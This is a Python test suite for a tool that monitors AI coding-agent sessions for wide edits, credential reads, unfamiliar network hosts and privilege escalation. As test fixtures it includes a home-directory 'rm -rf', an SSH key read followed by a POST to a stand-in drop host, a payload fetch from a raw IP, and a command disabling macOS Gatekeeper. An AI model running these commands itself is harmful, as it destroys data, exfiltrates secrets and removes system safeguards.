"""Behavioural detectors, per-runtime calibration, learned baselines, and the
money model (the four Guard gaps).

Pure unit tests over synthetic event sequences plus a real DuckDB store for the
baseline round-trip. Every detector gets a POSITIVE case (the behaviour it must
catch), a NEGATIVE case (the legitimate look-alike it must NOT flag), and —
for the two that see secrets — a REDACTION case, because an incident that
leaks the path it found is its own security bug.

Events are built in the store's on-the-wire ``query_events`` shape: dicts of
``{event_type, ts, data}`` ordered NEWEST-FIRST.
"""
from __future__ import annotations

import importlib
import json
import os
import sys

import pytest

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

from clawmetry import detectors  # noqa: E402


def _ts(i: int) -> str:
    return f"2026-06-11T10:{i // 60:02d}:{i % 60:02d}"


def _tool_call(name: str, args=None, i: int = 0) -> dict:
    return {"event_type": "tool_call", "ts": _ts(i),
            "data": {"tool": name, "args": args or {}}}


def _shell(cmd: str, i: int = 0, tool: str = "Bash") -> dict:
    return _tool_call(tool, {"command": cmd}, i)


def _newest_first(chronological: list) -> list:
    return list(reversed(chronological))


def _kinds(incidents) -> set:
    return {i["kind"] for i in incidents}


def _one(incidents, kind):
    matches = [i for i in incidents if i["kind"] == kind]
    assert matches, f"expected a {kind} incident, got {_kinds(incidents)}"
    return matches[0]


SID = "claude_code:abc123"


# ── file_blast_radius ────────────────────────────────────────────────────────
def test_blast_radius_flags_wide_edit():
    chrono = [_tool_call("Write", {"file_path": f"/w/proj/f{n}.py"}, n)
              for n in range(30)]
    inc = detectors.file_blast_radius(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["evidence"]["distinct_files"] == 30
    assert inc["severity"] == "warning"


def test_blast_radius_ignores_a_normal_edit_session():
    chrono = [_tool_call("Write", {"file_path": f"/w/proj/f{n}.py"}, n)
              for n in range(4)]
    assert detectors.file_blast_radius(_newest_first(chrono), SID, "claude_code") is None


def test_blast_radius_root_delete_is_critical():
    chrono = [_shell("rm -rf ~/", 1)]
    inc = detectors.file_blast_radius(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["severity"] == "critical"
    assert "recursive delete" in inc["title"]


def test_blast_radius_does_not_call_node_modules_cleanup_critical():
    # Removing a build directory is ordinary work: flagged as a destructive
    # command (worth seeing) but NOT as a root delete.
    chrono = [_shell("rm -rf ./node_modules", 1)]
    inc = detectors.file_blast_radius(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["severity"] == "warning"


def test_blast_radius_evidence_never_carries_a_full_path():
    chrono = [_tool_call("Write", {"file_path": f"/Users/dana/acme-secret/f{n}.py"}, n)
              for n in range(30)]
    inc = detectors.file_blast_radius(_newest_first(chrono), SID, "claude_code")
    blob = repr(inc)
    assert "/Users/dana" not in blob
    assert all(s.startswith(".../") for s in inc["evidence"]["samples"])


# ── credential_access ────────────────────────────────────────────────────────
def test_credential_access_flags_env_file_read():
    chrono = [_tool_call("Read", {"file_path": "/w/proj/.env"}, 1)]
    inc = detectors.credential_access(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["evidence"]["categories"] == ["environment file"]
    assert inc["severity"] == "warning"


def test_credential_access_ignores_env_example():
    chrono = [_tool_call("Read", {"file_path": "/w/proj/.env.example"}, 1)]
    assert detectors.credential_access(_newest_first(chrono), SID, "claude_code") is None


def test_credential_access_then_egress_is_critical():
    chrono = [_shell("cat ~/.ssh/id_ed25519", 1),
              _shell("curl -X POST -d @- https://drop.example.net/u", 2)]
    inc = detectors.credential_access(_newest_first(chrono), SID, "claude_code")
    assert inc["severity"] == "critical"
    assert inc["evidence"]["egress_after"] == ["drop.example.net"]


def test_credential_access_egress_before_does_not_escalate():
    # Ordering matters: fetching a page and THEN reading .env is not the
    # exfiltration shape, and calling it critical would be a false alarm.
    chrono = [_shell("curl https://pypi.org/simple", 1),
              _shell("cat /w/proj/.env", 2)]
    inc = detectors.credential_access(_newest_first(chrono), SID, "claude_code")
    assert inc["severity"] == "warning"


def test_credential_access_evidence_has_no_path_or_command():
    chrono = [_shell("cat /Users/dana/.ssh/id_rsa_prod_acme", 1)]
    inc = detectors.credential_access(_newest_first(chrono), SID, "claude_code")
    blob = repr(inc["evidence"])
    assert "id_rsa" not in blob and "/Users/dana" not in blob


# ── network_egress ───────────────────────────────────────────────────────────
def test_egress_first_time_needs_a_baseline():
    chrono = [_shell("curl https://api.example.com/v1", 1)]
    # No baseline: we have no memory, so we do not claim the host is new.
    assert detectors.network_egress(_newest_first(chrono), SID, "claude_code") is None


def test_egress_flags_a_host_absent_from_the_baseline():
    chrono = [_shell("curl https://pypi.org/simple", 1),
              _shell("curl https://weird.example.tk/x", 2)]
    th = detectors.resolve_thresholds(
        "claude_code", {"hosts": ["pypi.org"], "sessions": 50, "write_sessions": 9,
                        "tool_calls": {"n": 50, "mean": 20, "stddev": 5}})
    inc = detectors.network_egress(_newest_first(chrono), SID, "claude_code",
                                   thresholds=th)
    assert inc is not None
    assert inc["evidence"]["ground"] == "first_time"
    assert inc["evidence"]["new_hosts"] == ["weird.example.tk"]


def test_egress_ignores_localhost():
    chrono = [_shell("curl http://127.0.0.1:8900/api/overview", 1),
              _shell("curl http://localhost:3000/health", 2)]
    assert detectors.network_egress(_newest_first(chrono), SID, "claude_code") is None


def test_egress_flags_a_raw_ip_without_any_baseline():
    chrono = [_shell("curl http://203.0.113.9/payload", 1)]
    inc = detectors.network_egress(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["evidence"]["ground"] == "raw_address"
    assert inc["severity"] == "info"


# ── privilege_change ─────────────────────────────────────────────────────────
def test_privilege_change_flags_sudo():
    chrono = [_shell("sudo apt-get install -y jq", 1)]
    inc = detectors.privilege_change(_newest_first(chrono), SID, "claude_code")
    assert inc is not None
    assert inc["severity"] == "warning"


def test_privilege_change_disabling_a_protection_is_critical():
    chrono = [_shell("sudo spctl --master-disable", 1)]
    inc = detectors.privilege_change(_newest_first(chrono), SID, "claude_code")
    assert inc["severity"] == "critical"
    assert inc["evidence"]["irreversible"]


def test_privilege_change_ignores_ordinary_commands():
    chrono = [_shell("pytest -q", 1), _shell("git status", 2),
              _shell("grep -r sudoers docs/", 3)]
    assert detectors.privilege_change(_newest_first(chrono), SID, "claude_code") is None


def test_privilege_change_sketch_drops_secret_bearing_tokens():
    chrono = [_shell('sudo -S curl -H "Authorization: Bearer sk-live-abc" https://x', 1)]
    inc = detectors.privilege_change(_newest_first(chrono), SID, "claude_code")
    assert "sk-live-abc" not in repr(inc)
    assert "Bearer" not in repr(inc)


# ── per-runtime calibration ──────────────────────────────────────────────────
def test_runtime_profile_adds_the_runtimes_own_write_vocabulary():
    # The Gemini-CLI lineage (qwen_code, gemini_cli, antigravity) writes files
    # with a tool called ``replace``, which the module default vocabulary —
    # written for Anthropic-style names — does not match at all.
    assert detectors._is_write_tool(
        "replace", detectors.resolve_thresholds("qwen_code")["write_tools"])
    assert not detectors._is_write_tool("replace")
    # Goose's developer__text_editor is already covered by the default "edit"
    # substring; its profile entry is empty on purpose.
    assert detectors._is_write_tool("developer__text_editor")


def test_shell_mediated_write_counts_as_progress():
    # A codex session that writes a file through a heredoc must not look
    # identical to one that spun for an hour.
    chrono = [_shell(f"grep -n foo file{n}.py", n) for n in range(25)]
    chrono.append(_shell("cat > src/new_module.py <<'EOF'\nprint(1)\nEOF", 26))
    assert detectors.no_progress(_newest_first(chrono), "codex:x", "codex") is None
    # Without the write, the same session IS flagged.
    assert detectors.no_progress(_newest_first(chrono[:-1]), "codex:x", "codex")


def test_per_runtime_env_override_beats_the_global_default(monkeypatch):
    monkeypatch.setenv("CLAWMETRY_NOPROG_TOOLS__CODEX", "3")
    th_codex = detectors.resolve_thresholds("codex")
    th_other = detectors.resolve_thresholds("claude_code")
    assert th_codex["no_progress_tools"] == 3
    assert th_codex["sources"]["no_progress_tools"] == "env_runtime"
    assert th_other["no_progress_tools"] == detectors.NO_PROGRESS_TOOL_CALLS


def test_env_override_wins_over_a_learned_baseline(monkeypatch):
    monkeypatch.setenv("CLAWMETRY_NOPROG_TOOLS__CODEX", "7")
    baseline = {"sessions": 40, "write_sessions": 40,
                "tool_calls": {"n": 40, "mean": 100, "stddev": 10}}
    th = detectors.resolve_thresholds("codex", baseline)
    assert th["no_progress_tools"] == 7


# ── learned baselines ────────────────────────────────────────────────────────
def test_baseline_moves_the_threshold_and_says_so():
    baseline = {"sessions": 40, "write_sessions": 40,
                "tool_calls": {"n": 40, "mean": 40.0, "stddev": 5.0}}
    th = detectors.resolve_thresholds("claude_code", baseline)
    # mean + 2 sigma = 50, inside the clamp band around the static 20.
    assert th["no_progress_tools"] == 50
    assert th["sources"]["no_progress_tools"] == "baseline"


def test_thin_baseline_is_ignored():
    baseline = {"sessions": 3, "write_sessions": 3,
                "tool_calls": {"n": 3, "mean": 400.0, "stddev": 1.0}}
    th = detectors.resolve_thresholds("claude_code", baseline)
    assert th["no_progress_tools"] == detectors.NO_PROGRESS_TOOL_CALLS
    assert th["sources"]["no_progress_tools"] == "static"


def test_a_pathological_cohort_cannot_blind_the_detector():
    # Every session in this cohort loops forever. Learning from it unclamped
    # would raise the threshold until nothing ever fired again.
    baseline = {"sessions": 100, "write_sessions": 100,
                "tool_calls": {"n": 100, "mean": 5000.0, "stddev": 900.0}}
    th = detectors.resolve_thresholds("claude_code", baseline)
    ceiling = detectors.NO_PROGRESS_TOOL_CALLS * detectors.BASELINE_CEIL_RATIO
    assert th["no_progress_tools"] <= ceiling


def test_cohort_that_never_writes_disables_no_progress():
    # A runtime whose edits we cannot see must not have every session flagged
    # as "no file changes" — that is a fact about our visibility.
    baseline = {"sessions": 40, "write_sessions": 0,
                "tool_calls": {"n": 40, "mean": 30.0, "stddev": 4.0}}
    th = detectors.resolve_thresholds("aider", baseline)
    assert th["no_progress_enabled"] is False
    chrono = [_shell(f"echo {n}", n) for n in range(60)]
    assert detectors.no_progress(_newest_first(chrono), "aider:x", "aider",
                                 thresholds=th) is None


def test_session_profile_feeds_the_baseline():
    chrono = [_shell("curl https://pypi.org/simple", 1),
              _tool_call("Write", {"file_path": "/w/a.py"}, 2),
              _tool_call("Read", {"file_path": "/w/b.py"}, 3)]
    steps = detectors.normalize_events(_newest_first(chrono))
    profile = detectors.session_profile(
        steps, detectors.resolve_thresholds("claude_code")["write_tools"])
    assert profile["tool_calls"] == 3
    assert profile["wrote"] is True
    assert profile["hosts"] == ["pypi.org"]


# ── severity that maps to money ──────────────────────────────────────────────
def test_spend_at_risk_uses_the_burn_rate_when_the_clock_is_known():
    incidents = [{"kind": "stuck_loop", "severity": "warning",
                  "first_bad_step": 0, "evidence": {}}]
    out = detectors.annotate_spend(incidents, cost_usd=60.0,
                                   session_seconds=3600, bad_for_seconds=600)
    # $60/hour = $1/min, stuck for 10 minutes -> ~$10.
    assert out[0]["spend_at_risk_usd"] == pytest.approx(10.0, rel=0.01)
    assert out[0]["spend_basis"] == "burn_rate"


def test_spend_at_risk_is_zero_and_honest_without_inputs():
    incidents = [{"kind": "stuck_loop", "severity": "warning",
                  "first_bad_step": 0, "evidence": {}}]
    out = detectors.annotate_spend(incidents)
    assert out[0]["spend_at_risk_usd"] == 0.0
    assert out[0]["spend_basis"] == "unknown"


def test_money_promotes_a_warning_to_critical_but_never_an_info():
    warn = {"kind": "stuck_loop", "severity": "warning", "first_bad_step": 0,
            "evidence": {}}
    info = {"kind": "action_discrepancy", "severity": "info",
            "first_bad_step": 0, "evidence": {}}
    out = detectors.annotate_spend([warn, info], cost_usd=600.0,
                                   session_seconds=3600, bad_for_seconds=3600)
    by_kind = {i["kind"]: i for i in out}
    assert by_kind["stuck_loop"]["severity"] == "critical"
    assert by_kind["action_discrepancy"]["severity"] == "info"


def test_incidents_sort_by_what_ignoring_them_costs():
    cheap_warning = {"kind": "stuck_loop", "severity": "warning",
                     "spend_at_risk_usd": 0.02, "evidence": {}}
    expensive_info = {"kind": "action_discrepancy", "severity": "info",
                      "spend_at_risk_usd": 171.0, "evidence": {}}
    assert detectors.sort_incidents(
        [cheap_warning, expensive_info])[0]["kind"] == "action_discrepancy"


def test_run_all_prices_every_incident_it_returns():
    chrono = [_shell("cat /w/.env", n) for n in range(4)]
    out = detectors.run_all(_newest_first(chrono), SID, "claude_code",
                            facts={"cost_usd": 30.0, "session_seconds": 1800,
                                   "bad_for_seconds": 300})
    assert out, "expected at least one incident"
    for inc in out:
        assert "spend_at_risk_usd" in inc and "spend_basis" in inc


# ── the eight detectors are all wired into run_all ───────────────────────────
def test_every_detector_is_reachable_from_run_all():
    assert set(detectors.DETECTOR_KINDS) == {
        "stuck_loop", "no_progress", "repeated_tool_failure",
        "action_discrepancy", "file_blast_radius", "credential_access",
        "network_egress", "privilege_change",
    }


def test_run_all_never_raises_on_malformed_events():
    junk = [None, 42, "str", {"event_type": "tool_call", "data": "not-json{"},
            {"event_type": "tool_call", "data": {"tool": "Bash", "args": object()}}]
    assert isinstance(detectors.run_all(junk, SID, "claude_code"), list)


def test_healthy_session_trips_nothing():
    chrono = [_tool_call("Read", {"file_path": "/w/proj/a.py"}, 1),
              _tool_call("Edit", {"file_path": "/w/proj/a.py"}, 2),
              _shell("pytest -q", 3)]
    assert detectors.run_all(_newest_first(chrono), SID, "claude_code") == []


# ── baseline persistence (real DuckDB) ───────────────────────────────────────
@pytest.fixture()
def real_store(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAWMETRY_LOCAL_STORE_PATH", str(tmp_path / "guard.duckdb"))
    monkeypatch.setenv("CLAWMETRY_LOCAL_FLUSH_SECS", "0.05")
    from clawmetry import local_store as ls
    importlib.reload(ls)
    store = ls.LocalStore()
    yield store
    try:
        store.close()
    except Exception:
        pass


def test_baseline_round_trip_and_self_upsert(real_store):
    for i in range(25):
        real_store.record_guard_observation(
            f"s{i}", "runtime:codex", runtime="codex", tool_calls=10 + i,
            write_files=2, wrote=True, hosts=["pypi.org"])
    # Re-reading an ACTIVE session must update its row, not add a new one.
    real_store.record_guard_observation(
        "s0", "runtime:codex", runtime="codex", tool_calls=12, write_files=2,
        wrote=True, hosts=["pypi.org"])
    base = real_store.query_guard_baseline("runtime:codex")
    assert base["sessions"] == 25
    assert base["tool_calls"]["n"] == 25
    assert base["hosts"] == ["pypi.org"]
    assert real_store.query_guard_baseline(
        "runtime:codex", exclude_session="s1")["sessions"] == 24


def test_baseline_counts_only_sessions_that_wrote(real_store):
    for i in range(22):
        real_store.record_guard_observation(
            f"a{i}", "runtime:aider", runtime="aider", tool_calls=30,
            write_files=0, wrote=False)
    base = real_store.query_guard_baseline("runtime:aider")
    assert base["write_sessions"] == 0
    assert detectors.resolve_thresholds("aider", base)["no_progress_enabled"] is False


def test_unknown_cohort_returns_empty_not_garbage(real_store):
    assert real_store.query_guard_baseline("runtime:nobody") == {}
    assert real_store.query_guard_baseline("") == {}


def test_prune_drops_only_stale_rows(real_store):
    real_store.record_guard_observation("fresh", "runtime:codex", tool_calls=5)
    assert real_store.prune_guard_baseline(180) == 0
    assert real_store.query_guard_baseline("runtime:codex")["sessions"] == 1


# ── daemon integration: the loop closes ─────────────────────────────────────
# Detection -> incident -> loop_signal (with the money on it) -> baseline
# observation -> the NEXT tick's thresholds. Driven through the real daemon
# emitter so the wiring is pinned, not just the pure functions.
import clawmetry.sync as sync  # noqa: E402


class _FakeStore:
    """The emitter's store surface, forwarding writes into a real DuckDB."""

    def __init__(self, sessions, events_by_sid, sink):
        self._sessions = sessions
        self._events = events_by_sid
        self._sink = sink
        self.ingested: list = []

    def query_sessions_table(self, *, agent_type=None, limit=200):
        return list(self._sessions)[:limit]

    def query_events(self, *, session_id=None, limit=500, **kw):
        return list(reversed(self._events.get(session_id, [])))[:limit]

    def ingest_loop_signal(self, **kw):
        self.ingested.append(kw)
        self._sink.ingest_loop_signal(**kw)

    def record_guard_observation(self, *a, **kw):
        return self._sink.record_guard_observation(*a, **kw)

    def query_guard_baseline(self, *a, **kw):
        return self._sink.query_guard_baseline(*a, **kw)

    def prune_guard_baseline(self, *a, **kw):
        return self._sink.prune_guard_baseline(*a, **kw)

    def query_session_policies(self, enabled_only=False):
        return []


def _active_session(sid, runtime, cost=0.0):
    from datetime import datetime, timedelta
    now = datetime.now()
    return {"session_id": sid, "agent_type": runtime, "agent_id": "main",
            "status": "active", "ended_at": None,
            "started_at": (now - timedelta(minutes=30)).isoformat(),
            "last_active_at": now.isoformat(), "cost_usd": cost,
            "metadata": {"cwd": "/w/proj"}}


def test_daemon_tick_records_the_baseline_and_prices_the_incident(real_store):
    sid = "claude_code:tick1"
    chrono = [_shell("rm -rf ~/", 1),
              _shell("curl https://pypi.org/simple", 2)]
    fake = _FakeStore([_active_session(sid, "claude_code", cost=12.0)],
                      {sid: chrono}, real_store)

    state: dict = {}
    assert sync._emit_detector_incidents(fake, state) >= 1

    # 1. The incident reached loop_signals WITH the money on it.
    sigs = real_store.query_recent_loop_signals(limit=10, since_minutes=30)
    assert sigs, "the tick must write at least one signal"
    details = [s.get("details") for s in sigs]
    details = [json.loads(d) if isinstance(d, str) else d for d in details]
    assert any("spend_at_risk_usd" in (d or {}) for d in details)
    # A recursive delete at a home root is the critical tier.
    assert any((d or {}).get("kind") == "file_blast_radius" for d in details)
    assert any(s.get("severity") == "critical" for s in sigs)

    # 2. The session taught its cohort what it looked like.
    base = real_store.query_guard_baseline("agent:claude_code:main")
    assert base["sessions"] == 1
    assert "pypi.org" in (base.get("hosts") or [])
    # ...and the runtime-wide cohort too, so a rarely-used agent still has a
    # population to be compared against.
    assert real_store.query_guard_baseline("runtime:claude_code")["sessions"] == 1


def test_daemon_tick_does_not_double_count_a_session_across_ticks(real_store):
    sid = "codex:tick2"
    chrono = [_shell(f"grep -n foo f{n}.py", n) for n in range(5)]
    fake = _FakeStore([_active_session(sid, "codex")], {sid: chrono}, real_store)
    for _ in range(3):
        sync._emit_detector_incidents(fake, {})
    assert real_store.query_guard_baseline("runtime:codex")["sessions"] == 1
